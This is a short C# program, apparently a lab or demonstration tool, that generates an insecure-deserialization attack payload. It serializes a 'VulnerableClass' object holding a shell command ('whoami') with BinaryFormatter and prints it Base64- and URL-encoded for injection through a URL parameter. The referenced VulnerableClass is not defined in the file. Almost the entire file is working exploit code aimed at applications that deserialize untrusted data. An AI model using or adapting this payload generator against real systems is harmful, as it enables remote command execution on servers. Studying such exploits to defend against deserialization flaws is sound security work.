using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;

class PayloadGenerator
{
    static void Main()
    {
        // Generate the malicious payload
        byte[] payload = CreateMaliciousPayload("whoami");

        // Convert to Base64 to simulate URL parameter
        string base64Payload = Convert.ToBase64String(payload);
        string urlEncodedPayload = Uri.EscapeDataString(base64Payload);
        Console.WriteLine($"Malicious Base64 Payload: {urlEncodedPayload}");
    }

    static byte[] CreateMaliciousPayload(string command)
    {
        // Initialize the VulnerableClass object with a command using the correct syntax
        VulnerableClass payload = new VulnerableClass { Command = command };

        using (MemoryStream memoryStream = new MemoryStream())
        {
            BinaryFormatter formatter = new BinaryFormatter();
            formatter.Serialize(memoryStream, payload);
            return memoryStream.ToArray();
        }
    }
}
